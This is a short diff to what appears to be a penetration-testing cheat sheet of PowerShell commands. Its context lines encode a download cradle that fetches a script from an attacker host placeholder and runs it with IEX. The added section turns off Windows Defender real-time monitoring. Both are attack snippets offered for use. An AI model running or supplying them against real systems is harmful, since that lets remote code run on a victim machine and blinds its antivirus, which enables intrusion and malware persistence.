@@ -128,3 +128,8 @@ $proxyAddr=(Get-ItemProperty -Path "HKU:$start\Software\Microsoft\Windows\Curren
 ```powershell
 pwsh -Command '$text = "(New-Object System.Net.WebClient).DownloadString(''http://<lhost>/<file>'') | IEX";$bytes = [System.Text.Encoding]::Unicode.GetBytes($text);$EncodedText = [Convert]::ToBase64String($bytes);$EncodedText'
 ```
+
+## powershell - disable Real Time Monitoring (Windows Defender)
+```powershell
+Set-MpPreference -DisableRealtimeMonitoring $true
+```
